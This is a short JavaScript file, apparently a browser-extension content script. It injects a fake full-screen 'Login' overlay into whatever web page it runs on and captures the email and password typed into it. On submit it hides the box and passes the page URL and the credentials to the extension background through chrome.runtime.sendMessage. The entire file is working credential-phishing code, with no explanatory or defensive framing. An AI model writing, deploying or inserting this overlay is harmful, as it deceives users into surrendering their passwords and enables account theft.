var div = document.createElement("div");
div.setAttribute("id", "loginBox");
div.setAttribute("style", "display: block; position: fixed; z-index: 1; padding-top: 100px; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgb(0,0,0); background-color: rgba(0,0,0,0.4);");
var innerDiv = document.createElement("div");
innerDiv.setAttribute("style", "text-align: center; background-color: #fefefe; margin: auto; padding: 20px; border: 1px solid #888; width: 10%;");
var headerDiv = document.createElement("div");
var header = document.createElement("h1");
header.appendChild(document.createTextNode("Login"));
var emailDiv1 = document.createElement("div");
var label1 = document.createElement("label");
label1.setAttribute("for", "pEmail");
label1.appendChild(document.createTextNode("Email"));
var emailDiv2 = document.createElement("div");
var input1 = document.createElement("input");
input1.setAttribute("id", "pEmail");
input1.setAttribute("type", "text");
input1.setAttribute("placeholder", "Enter Email");
input1.setAttribute("name", "pEmail");
var pswDiv1 = document.createElement("div");
var label2 = document.createElement("label");
label2.setAttribute("for", "psw");
label2.appendChild(document.createTextNode("Password"));
var pswDiv2 = document.createElement("div");
var input2 = document.createElement("input");
input2.setAttribute("id", "pPsw");
input2.setAttribute("type", "password");
input2.setAttribute("placeholder", "Enter Password");
input2.setAttribute("name", "pPsw");
var buttonDiv = document.createElement("div");
var submitButton = document.createElement("button");
submitButton.onclick = submitFunction;
submitButton.appendChild(document.createTextNode("Login"));

headerDiv.appendChild(header);
emailDiv1.appendChild(label1);
emailDiv2.appendChild(input1);
pswDiv1.appendChild(label2);
pswDiv2.appendChild(input2);
buttonDiv.appendChild(submitButton);
innerDiv.appendChild(headerDiv);
innerDiv.appendChild(emailDiv1);
innerDiv.appendChild(emailDiv2);
innerDiv.appendChild(pswDiv1);
innerDiv.appendChild(pswDiv2);
innerDiv.appendChild(buttonDiv);
div.appendChild(innerDiv);
document.body.appendChild(div);

function submitFunction() {
  if (document.getElementById('pEmail').value && document.getElementById('pPsw').value) {
    document.getElementById('loginBox').style.display = "none";
    chrome.runtime.sendMessage({
      loginListener: location.href + ' ' + document.getElementById('pEmail').value + ":" + document.getElementById('pPsw').value
    });
  }
}
